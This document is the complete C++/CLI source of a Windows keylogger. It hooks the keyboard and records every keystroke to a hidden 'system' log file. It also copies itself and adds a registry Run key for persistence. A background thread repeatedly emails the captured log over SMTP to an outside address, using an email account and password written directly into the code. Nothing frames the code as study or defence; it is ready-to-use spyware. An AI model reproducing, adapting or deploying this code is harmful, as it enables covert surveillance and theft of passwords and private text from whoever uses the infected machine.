#include <windows.h>
#include <fstream>
#include <iostream>
#include <algorithm>
#include <string>
#include <tchar.h>
#include <process.h>
#using <System.dll>

using namespace System;
using namespace System::Diagnostics;
using namespace System::Net::Mail;
using namespace System::Net::Mime;
using namespace System::Threading;
using namespace System::ComponentModel;

#define STRLENN(x) (sizeof(x)/sizeof(TCHAR) - 1)

static bool mailSent;
static bool openFile;
static bool stopThread;

std::string myKey;
BOOL isCaps();

char logName[] = "sysdat.log";//LOG FILE name
							  //init all varibles for speed
MSG message;
HHOOK keyboardHook;
char keyNameBuff[16];
PKBDLLHOOKSTRUCT p;
unsigned int sc;


static void SendCompletedCallback(Object^ sender, AsyncCompletedEventArgs^ e)
{
	// Get the unique identifier for this asynchronous 
	// operation.
	String^ token = (String^)e->UserState;
	if (e->Cancelled)
	{
		Console::WriteLine("[{0}] Send canceled.", token);
	}
	if (e->Error != nullptr)
	{
		Console::WriteLine("[{0}] {1}", token,
                 		e->Error->ToString());
	}
	else
	{
		Console::WriteLine("Message sent.");
	}
		mailSent = true;
	}
unsigned _stdcall sendFileFun(void* pArguments)
{
	SmtpClient^ client = gcnew SmtpClient("smtp.mail.ru", 25);
	client->EnableSsl = true;
	client->DeliveryMethod = SmtpDeliveryMethod::Network;
	client->Credentials = gcnew System::Net::NetworkCredential("testforname@mail.ru", "chidori67");
	MailAddress^ from = gcnew MailAddress("testforname@mail.ru",
												"Good" + "Luck",
									System::Text::Encoding::UTF8);
	MailAddress^ to = gcnew MailAddress("kolyabamberg@gmail.com");
	MailMessage^ message = gcnew MailMessage(from, to);
	while(stopThread){			
		SetFileAttributes(LPCWSTR(logName), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
		std::ifstream log(logName, std::ios::app); //opens log file	
		std::string* content = new std::string(std::istreambuf_iterator<char>(log), std::istreambuf_iterator<char>());
		message->Body = gcnew String(content->c_str());
		message->BodyEncoding = System::Text::Encoding::UTF8;
		client->SendCompleted += gcnew	SendCompletedEventHandler(SendCompletedCallback);
		String^ userState = "test message1";
		client->SendAsync(message, userState);			
		System::Threading::Thread::Sleep(5000);
		if (mailSent == false)
		{
			client->SendAsyncCancel();
		}
		message->Body = nullptr;
		Thread::Sleep(10000);
    }
		client = nullptr;
		delete message;
		_endthreadex(0);
		return 0;
}

void writeToLog(std::string s) //write a string to the log
{
//  while (openFile);
//	openFile = true;
	SetFileAttributes(LPCWSTR(logName), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	std::ofstream log(logName, std::ios::app); //opens log file
	log << s; //writes to log.. with format '['']'
	log.close(); //closes log
//  openFile = false;
}
BOOL isCaps()
{
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ||
		((GetKeyState(VK_SHIFT) & 0x8000) != 0)) {
		return 1;
	}
	else {
		return 0;
	}
}
LRESULT CALLBACK hookProc(int nCode,
	WPARAM wParam, LPARAM lParam)//proc to be run on hooked key
{
	if (wParam == WM_KEYDOWN)//if key event type is key down
	{
		//get the keyname from lParam
		p = (PKBDLLHOOKSTRUCT)(lParam);//used to get the vkCode
		sc = MapVirtualKey(p->vkCode, 0);
		sc <<= 16; //shift 16 bits

		if (!(p->vkCode <= 32))//if not ascii
		{
			sc |= 0x1 << 24; // <- extended bit
		}
		GetKeyNameTextA(sc, keyNameBuff, 16);

		//gets ASCII key name from sc into keyNameBuff

			//write keyname to log
		myKey = keyNameBuff;
		if (myKey == "Space") {
			writeToLog(" ");
		}
		else if (myKey == "Right Alt") {
			writeToLog("[R ALT]");
		}
		else if (myKey == "Enter") {
			writeToLog("[ENTER]");
		}
		else if (myKey == "Left Alt") {
			writeToLog("[L ALT]");
		}
		else if (myKey == "Tab") {
			writeToLog("[TAB]");
		}
		else if (myKey == "Backspace") {
			writeToLog("[BS]");
		}
		else if (myKey == "Caps Lock") {
			writeToLog("[CAPS]");
		}
		else if (myKey == "Delete") {
			writeToLog("[DEL]");
		}
		else if (myKey == "Right Shift") {
			writeToLog("[R SHIFT]");
		}
		else if (myKey == "Shift") {
			writeToLog("[L SHIFT]");
		}
		else if (myKey == "Ctrl") {
			writeToLog("[L CTRL]");
		}
		else if (myKey == "Right Ctrl") {
			writeToLog("[R CTRL]");
		}
		// if its none of the special keys
		else {
			if (isCaps() == 1) {
				writeToLog(myKey);
			}
			else {
				std::transform(myKey.begin(), myKey.end(),
					myKey.begin(), ::tolower);
				writeToLog(myKey);
			}
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void msgLoop()
{
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}
BOOL SelfAutorun() {
	HKEY hKey = NULL;
	LONG lResult = 0;
	TCHAR szExeName[MAX_PATH + 1];
	TCHAR szWinPath[MAX_PATH + 1];
	GetModuleFileName(NULL, szExeName, STRLENN(szExeName));
	GetWindowsDirectory(szWinPath, STRLENN(szWinPath));
	//lstrcat(szWinPath, TEXT("\\Autorun.exe"));
	if (0 == CopyFile(szExeName, TEXT("E:\\Autorun.exe"), FALSE)) {
		return FALSE;
	}
	lResult = RegOpenKey(
		HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		&hKey);
	if (ERROR_SUCCESS != lResult) {
		return FALSE;
	}
	RegSetValueEx(hKey, L"Autorun", 0, REG_SZ, (PBYTE)TEXT("E:\\Autorun.exe"),
		lstrlen(TEXT("E:\\Autorun.exe")) * sizeof(TCHAR) + 1);
	RegCloseKey(hKey);
	return TRUE;
}
int WINAPI WinMain(HINSTANCE hInstance,
HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	stopThread = true;
	if(!SelfAutorun()) return 1;
	if (Process::GetProcessesByName("logger")->Length > 1) return 0;
	HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, &sendFileFun, NULL, 0, NULL);
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, hInstance, 0); //hooks keyboard
	msgLoop(); //stops from closing      
	stopThread = false;
	UnhookWindowsHookEx(keyboardHook); //unhooks
	return 0; //Never run
}
